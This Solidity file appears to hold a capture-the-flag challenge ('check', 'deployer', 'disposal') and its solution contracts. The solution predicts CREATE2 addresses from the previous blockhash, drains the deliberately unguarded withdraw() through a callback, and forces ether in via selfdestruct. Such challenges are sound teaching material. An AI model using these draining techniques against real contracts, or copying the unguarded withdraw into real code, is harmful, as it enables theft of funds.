//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
// 1.check合约余额大于0。2.disposal合约余额归零。
contract disposal {
    address public owner;
    address public dep;

    constructor(address _owner) payable {
        owner = _owner;
        dep = msg.sender;
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract deployer {
    constructor(bytes32 salt) payable {
        disposal dis = new disposal{value: msg.value, salt: salt}(msg.sender);
    }
}

contract check {
    uint256 public score;

    constructor() public payable {}

    function isCompleted(address _addr) public payable {
        score = 0;
        require(msg.value > 0);
        bytes32 salt = blockhash(block.number - 1);
        deployer dep = new deployer{value: msg.value, salt: salt}(salt);

        (bool success,bytes memory data)=msg.sender.call("cuit()");
        require(success,string(data));
        if (address(this).balance > 0) {
            score += 25;
        }
        if (
            disposal(_addr).owner() == address(this) &&
            disposal(_addr).dep() == address(dep) &&
            _addr.balance == 0
        ) {
            score += 75;
        }
    }
}
contract getb{
    address payable a;
    constructor(address payable addr)public {
        a = addr;
    }
    function g() public payable  {
        selfdestruct(a);
    }
}
contract att{
    check che;
    // attck at;
    bytes32 public salt;
    constructor(check addr ) public {
        che = addr;
        // at = addr1;
    }
    function getbytes2() public {
        salt = blockhash(block.number - 1);
        // at.getbytes2();
    }
    function getbytes3() public view returns(bytes32) {
        return blockhash(block.number - 2);
    }
    function cuit() public returns(bool) {
        disposal(getdisposaladdress()).withdraw();
        return true;
    }
    receive() external payable {}
    fallback()external payable{
        disposal(getdisposaladdress()).withdraw();
    }
    function attract() public payable {
        salt = blockhash(block.number - 1);
        che.isCompleted{value : msg.value}(getdisposaladdress());
    }
    function getdeployerbytes(bytes32 salt1) public view returns (bytes memory){
        bytes memory code = type(deployer).creationCode;
        return abi.encodePacked(code,abi.encode(salt1));
    }
    function getdisposalbytes(address addr) public view returns (bytes memory){
        bytes memory code = type(disposal).creationCode;
        return abi.encodePacked(code,abi.encode(addr));
    }
    function getdeployeraddress() public view returns(address){
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(che),
                            salt,
                            keccak256(getdeployerbytes(salt))
                        )))));
    }
    function getdisposaladdress() public view returns(address){
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            getdeployeraddress(),
                            salt,
                            keccak256(getdisposalbytes(address(che)))
                        )))));
    }
}
contract attck {
    check public che;
    bytes32 public salt;
    constructor(address _che) {
        che = check(_che);
    }

    function dep() public payable {
        salt = blockhash(block.number - 1);
        che.isCompleted{value: msg.value}(figure2());
    }

    function getBytecode(bytes32 _salt) public pure returns (bytes memory) {
        bytes memory bytecode = type(deployer).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_salt));
    }
    function getBytecode1(address _addr) public pure returns (bytes memory) {
        bytes memory bytecode = type(disposal).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_addr));
    }
    function getbytes2() public {
        salt = blockhash(block.number - 1);
    }
    fallback()external payable{
        disposal(figure2()).withdraw();
    }
    receive()external payable{}

    function figure1() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                address(che),
                                salt,
                                keccak256(getBytecode(salt))
                            )
                        )
                    )
                )
            );
    }
    function figure2() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                figure1(),
                                salt,
                                keccak256(getBytecode1(address(che)))
                            )
                        )
                    )
                )
            );
    }
}
contract self{
    constructor(address payable _addr)payable{
        selfdestruct(_addr);
    }
}